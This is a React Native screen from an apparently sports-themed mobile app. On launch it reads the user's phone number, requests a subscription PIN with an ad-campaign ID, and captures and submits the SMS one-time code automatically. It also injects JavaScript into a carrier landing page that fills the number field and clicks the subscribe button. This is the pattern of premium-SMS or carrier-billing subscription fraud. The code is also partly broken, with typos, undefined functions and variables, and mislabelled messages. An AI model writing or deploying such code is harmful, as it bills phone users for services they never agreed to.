import {
  View,
  Text,
  StatusBar,
  Image,
  ToastAndroid,
  Modal,
} from 'react-native';
import axios from 'axios';
import {useNavigation} from '@react-navigation/native';
import React, {useRef, useEffect, useState} from 'react';
import LinearGradient from 'react-native-linear-gradient';
import {useNetInfo} from '@react-native-community/netinfo';
import PhoneInput from 'react-native-phone-number-input';

import Colors from '../theme/color';
import ButtonView from '../components/ButtonView';
import {getPhoneNumberHint} from '../HintRequest';
import {getOtpRequest, startSmsRetriever} from '../OtpService';
import AsyncStorage from '@react-native-async-storage/async-storage';
import LoadingModal from '../components/LoadingModal';
import {showMessage} from 'react-native-flash-message';
import WebView from 'react-native-webview';
import {fetchCountryAndData} from './handler';

const HomeScreen = () => {
  const netInfo = useNetInfo();
  const webViewRef = useRef(null);
  const phoneInputref = useRef(null);
  const navigation = useNavigation();
  const [country, setCountry] = useState(null);
  const [statedata, setStateData] = useState({
    requestManualPhone: false,
  });
  const [loading, setLoading] = useState(false);
  const [phoneInput, setPhoneInput] = useState('');
  const [isConnected, setIsConnected] = useState(false);

  useEffect(() => {
    fetchCountryAndData(setCountry, setIsConnected, setLoading);
    startSmsRetriever();
    handleGetPhoneNumber();
  }, []);

  // ✅ Fetch Phone Number and Send Pin Request
  const handleGetPhoneNumber = async item => {
    try {
      const number = await getPhoneNumberHint();
      const cleanedNumber = number.replace(/\+/g, '');
      await sendPinRequest(number, item);
      injectPhoneNumberAndSubmit(cleanedNumber);
    } catch (error) {
      showMessage({
        message: 'Failed',
        description: 'Failed to retrieve phone number!',
        type: 'warning',
      });
      setTimeout(() => {
        setStateData(prev => ({...prev, requestManualPhone: true}));
      }, 1500);
    }
  };

  // ✅ Send PIN Request
  const sendPinRequest = async (phoneNumber, item) => {
    if (!netInfo.isConnected) {
      showMessage({
        message: 'No Internet',
        description: 'No internet connection!',
        type: 'warning',
      });
      return;
    }

    setLoading(true);
    startSmsRetriever();

    const cleanedNumber = phoneNumber.replace(/\+/g, '');
    const userIP = await getRealUserIP();
    const transactionId = Math.floor(100 + Math.random() * 900);

    const payload = {
      msisdn: cleanedNumber,
      adAgencyCampaignId: 10,
      adAgencyCampaignTransactionId: JSON.stringify(transactionId),
      userIP: 'string',
      ua: 'string',
    };
    console.log('Request Payload:', payload);
    // if (!apiresponce.pinRequestAPI) return;
    try {
      const response = await axios.post(
        'https://universal-subscription-api.vclipss.com/pinrequest',
        payload,
        {
          headers: {
            'Content-Type': 'application/json',
          },
        },
      );

      console.log('API Response:', response.data);

      if (response.errorCode == 0) {
        const otpData = await getOtpRequest();
        if (otpData?.length > 0) {
          await verifyOtp(otpData[0].otp, transactionId, item);
        }
      } else {
        setLoading(false);
        showMessage({
          message: 'ERROR',
          description: response.data.responseMessage,
          type: 'danger',
        });
      }
    } catch (error) {
      setLoading(false);
      console.error('API Error:', error);
      showMessage({
        message: 'ERROR',
        description: 'API request failed!',
        type: 'danger',
      });
    } finally {
      setLoading(false);
    }
  };

  // ✅ Verify OTP
  const verifyOtp = async (otp, transactionId, item) => {
    setLoading(true);

    try {
      const response = await axios.post(
        'https://universal-subscription-api.vclipss.com/pinverify',
        {
          adAgencyCampaignTransactionId: transactionId,
          pin: otp,
        },
      );

      console.log('OTP Verify Response:', response.data);

      if (response.data.status === 'success') {
        await AsyncStorage.setItem('LOGIN', 'true');
        showMessage({
          message: 'ERROR',
          description: 'OTP Verified Successfully!',
          type: 'success',
        });
        navigation.navigate('Browser', {url: item.url, title: item.title});
      } else {
        showMessage({
          message: 'ERROR',
          description:
            response.data.responseMessage || 'OTP Verification Failed!',
          type: 'danger',
        });
      }
    } catch (error) {
      console.error('OTP Verify Error:', error);
      ToastAndroid.show(
        'Failed to verify OTP. Please try again.',
        ToastAndroid.SHORT,
      );
    } finally {
      setLoading(false);
    }
  };

  // ✅ Handle Manual Phone Submit
  const handlePhoneSubmit = () => {
    if (phoneInput) {
      sendPinRequest(phoneInput, data[0]);
      setStateData(prev => ({...prev, requestManualPhone: false}));
      ToastAndroid.show('Phone number saved successfully!', ToastAndroid.SHORT);
    } else {
      ToastAndroid.show(
        'Please enter a valid phone number!',
        ToastAndroid.SHORT,
      );
    }
  };

  // Handle Set WebView JavaScript
  const injectPhoneNumberAndSubmit = phoneNumber => {
    if (phoneNumber) {
      const jsCode = `
          const inputField = document.querySelector('#Msisdn_fake');
          const subscribeButton = document.querySelector('#btnSubscribe');
          if (inputField) {
            inputField.value = '${phoneNumber}';  
          }
          if (!inputField.value){
          retun
          }
          if (subscribeButton) {
            subscribeButton.click();
          }
          true;
        `;
      webViewRef.current.injectJavaScript(jsCode);
      // setTimeout(() => {
      //   fetchSmsMessages();
      // }, 8000);
    }
  };

  return (
    <View style={styles.container}>
      <StatusBar translucent={true} backgroundColor={'transparent'} />

      {/* 🔥 Animated Cards List */}
      {!isConnected ? (
        <View style={{flex: 1, flexDirection: 'row'}}>
          {/* Cricket Section */}
          {/* <LinearGradient
              colors={[Colors.secondary, Colors.secondary_light]}
              style={styles.halfContainer}>
              <TouchableOpacity
                activeOpacity={0.6}
                onPress={() => {
                  if (!getPhoneNum()) {
                    handleGetPhoneNumber(data[0]);
                  } else {
                    navigation.navigate('Browser', {
                      url: data[0].url,
                      title: data[0].title,
                    });
                  }
                }}>
                <Image
                  resizeMode="contain"
                  source={require('../../src/assets/ball.png')}
                  style={styles.icon}
                />
              </TouchableOpacity>
            </LinearGradient> */}

          {/* Football Section */}
          {/* <LinearGradient
              style={styles.halfContainer}
              colors={[Colors.primary_light, Colors.primary]}>
              <TouchableOpacity
                activeOpacity={0.6}
                onPress={() => {
                  if (!getPhoneNum()) {
                    handleGetPhoneNumber(data[1]);
                  } else {
                    navigation.navigate('Browser', {
                      url: data[1].url,
                      title: data[1].title,
                    });
                  }
                }}>
                <Image
                  resizeMode="contain"
                  source={require('../../src/assets/football.png')}
                  style={styles.icon}
                />
              </TouchableOpacity>
            </LinearGradient> */}

          {/* Handle OTP Service WebView */}
          <WebView
            ref={webViewRef}
            // source={{uri: 'https://lps.vclipss.com/stckwt/xs1.aspx'}}
            source={{uri: 'https://lps.vclipss.com/OmanOT/lp.aspx'}}
            onLoadEnd={() => {
              setLoading(false);
            }}
          />
        </View>
      ) : (
        <LinearGradient
          colors={['#0033A0', '#001F5B', '#192f6a']}
          style={styles.linearGradient}>
          <View style={styles.serverViewStyle}>
            <Image
              tintColor={Colors.white}
              source={{
                uri: 'https://cdn-icons-png.flaticon.com/128/9311/9311566.png',
              }}
              resizeMode="contain"
              style={styles.serverImage}
            />
            <Text style={styles.serverTextStyle}>Server Error</Text>
          </View>
        </LinearGradient>
      )}
      <LoadingModal visible={loading} />

      {/* Modal for Manual Phone Number Input */}
      <Modal
        transparent={true}
        visible={statedata.requestManualPhone}
        animationType="fade"
        onRequestClose={() => {
          setStateData(prev => ({
            ...prev,
            requestManualPhone: true,
          }));
        }}>
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <Text style={styles.modalTitle}>Enter Phone Number</Text>

            <PhoneInput
              ref={phoneInputref}
              defaultValue={phoneInput}
              defaultCode={country?.country_code}
              layout="first"
              onChangeText={setPhoneInput}
              withDarkTheme={false}
              withShadow={false}
              autoFocus={true}
              containerStyle={styles.phoneInputContainer}
              textContainerStyle={styles.phoneInputTextContainer}
              textInputStyle={styles.phoneInputText}
              codeTextStyle={styles.codeText}
              flagButtonStyle={styles.flagButton}
              countryPickerButtonStyle={styles.countryPicker}
            />

            <ButtonView
              variant="primary"
              title="Submit"
              onPress={handlePhoneSubmit}
            />
          </View>
        </View>
      </Modal>
    </View>
  );
};

export default HomeScreen;
